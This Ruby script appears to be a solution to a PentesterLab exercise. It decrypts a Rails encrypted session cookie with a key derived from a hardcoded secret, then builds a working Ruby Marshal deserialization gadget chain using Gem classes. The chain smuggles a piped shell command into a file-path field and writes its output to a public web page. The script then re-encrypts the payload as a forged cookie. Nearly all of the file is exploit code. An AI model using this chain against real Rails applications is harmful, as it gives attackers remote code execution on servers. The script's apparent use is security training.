require 'uri'
require 'openssl'
require 'base64'
require 'json'


cookie=URI.decode "aenYb5wd67QoU5Udr660MTn%2F8ZFUnKOz1DCQnZLQdHaL9X9ZI%2B6o8riqRygu1i1UnDKX%2BvtCgS3yfRd3nvIsLNnb%2BYrnzR44IJUdsGb6PbvewkbFXR8oz%2Bgr%2BRM6PWVyQo9h3F0qJCTxOQwQbWUKSte7QJaWTnP5vg3nhS3RkYPirnaEWSRFgslIilKdOeWY3UCDV4YmgIH4X4UKUkmeoyK8DdHUtmou%2BvVDBS85WdOvJOh1BzZQ1yiF5ja8OW9YzZ3swNN0q%2Bnw7ivIS%2B21EoYh1Rd6ye7kmdsijLiwvh8i%2BaHBkgoFW3MZo4C9XneuvR0%2FXH%2FOgd2uGHloiIIb%2F8V3%2FFBCXJwxC1Gf%2B57o%2BS4KvBiyb6c%2BuDTwMmRLqLsG42pZkwGL8fIBH7l4oQ%3D%3D--v6EGMwzw7ObjIKuB--%2B3prpTaSRteB9Crrxz6Mfg%3D%3D"

def secret
  secret = Digest::MD5.hexdigest("PentesterLab::Application")
  OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
end
cipher = OpenSSL::Cipher.new("aes-256-gcm")

encrypted_data, iv, auth_tag = cookie.split("--").map { |v| ::Base64.strict_decode64(v) }

cipher.decrypt
cipher.key = secret
cipher.iv = iv
cipher.auth_tag = auth_tag
cipher.auth_data = ""

decrypted_data = cipher.update(encrypted_data)
decrypted_data << cipher.final
puts decrypted_data


class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|/usr/local/bin/score 4c449dfe-425b-4c03-a183-9a225e898bf9 >/myapp/public/test.html")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts

puts payload
cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

iv = cipher.random_iv
cipher.auth_data = ""

encrypted_data = cipher.update(payload)
encrypted_data << cipher.final

blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv }"
blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
puts URI.escape(blob, "=/+")

